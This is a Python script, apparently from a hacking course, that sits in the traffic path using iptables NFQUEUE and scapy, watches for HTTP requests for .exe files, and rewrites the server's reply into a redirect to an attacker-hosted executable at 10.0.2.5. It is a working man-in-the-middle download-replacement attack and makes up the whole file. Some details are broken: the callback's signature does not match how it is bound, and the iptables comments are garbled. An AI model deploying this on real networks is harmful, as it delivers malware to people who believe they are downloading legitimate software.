#!/usr/bin/env python

# iptables - I INPUT - j NFQUEUE - -queue-num 0
# iptables - I OUTPUT - j NFQUEUE - -queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables --flush

import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # delete IP and TCP len/chksum values
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet, scapy_packet, file_type):
    scapy_packet = scapy.IP(packet.get_payload())
    # convert the packet to a scapy packet
    if scapy_packet.haslayer(scapy.Raw):

        # modify the packet file type
        if scapy_packet[scapy.TCP].dport == 80:
            # print('HTTP Request')
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] ' + 'exe' + ' request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            # print('HTTP Response')
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file')
                modified_packet = set_load(
                    scapy_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.5/unchi/CGoban.exe\n\n')

                # convert packet to a string
                packet.set_payload(str(modified_packet))
            # print(scapy_packet.show())

        # print(scapy_packet.show())
    packet.accept()


# def process_packet(packet):
#     scapy_packet = scapy.IP(packet.get_payload())
#     modify_packet(packet, scapy_packet,
#                   options.file_type)
#     packet.accept()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n \n [+] Detected ctrl+c ... Quitting ...!!!")
